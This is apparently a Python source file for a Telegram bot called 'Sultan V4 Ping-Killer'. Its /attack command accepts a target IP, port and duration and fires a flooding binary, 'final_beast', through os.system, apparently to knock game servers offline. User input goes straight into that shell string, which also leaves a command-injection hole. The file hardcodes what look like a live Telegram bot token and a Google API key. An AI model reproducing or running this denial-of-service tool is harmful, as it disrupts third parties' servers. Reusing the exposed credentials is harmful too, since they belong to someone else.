import telebot, os, threading, google.generativeai as genai
from flask import Flask

# --- CONFIGURATION ---
TOKEN = "7507508870:AAHyzqF-7QKydZZeTSwzs0JpnM65BExLGsw"
genai.configure(api_key="AIzaSyCcpvCR_G6qp1F6g_Dj1QEYKIr8PdPVMF0")
model = genai.GenerativeModel('gemini-1.5-flash')

bot = telebot.TeleBot(TOKEN)
app = Flask('')

ADMIN_ID = 5961723105
logged_in = [ADMIN_ID]

@app.route('/')
def home(): return "🔱 Sultan V4: Ping-Killer is Online! 🔱"

# --- POWER ATTACK ENGINE ---
def execute_attack(ip, port, dur):
    # Kernel level par binary fire karna
    os.system(f"chmod +x final_beast && ./final_beast {ip} {port} {dur} 1200")

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "🔱 **SULTAN V4 ACTIVE** 🔱\n\nNaya Token lag gaya hai. Ab /attack check karein.")

@bot.message_handler(commands=['attack'])
def attack_handle(message):
    if message.from_user.id not in logged_in:
        bot.reply_to(message, "🚫 Access Denied!")
        return
    
    args = message.text.split()
    if len(args) < 4:
        bot.reply_to(message, "❌ Format: /attack <IP> <PORT> <TIME>")
        return
    
    ip, port, dur = args[1], args[2], args[3]
    bot.reply_to(message, f"🔥 **SULTAN PING-KILLER FIRED!**\nTarget: `{ip}:{port}`\n⏳ Game hilega, wait karein!")
    
    # Background threading for maximum stability
    threading.Thread(target=execute_attack, args=(ip, port, dur)).start()

@bot.message_handler(func=lambda m: not m.text.startswith('/'))
def chat(message):
    try:
        res = model.generate_content(f"Short reply in Hinglish. User: {message.text}")
        bot.reply_to(message, res.text)
    except: pass

if __name__ == "__main__":
    # Render support
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=10000)).start()
    
    # Conflict destroyer
    bot.remove_webhook()
    print("Conflict Cleared! Starting Sultan...")
    bot.polling(none_stop=True)
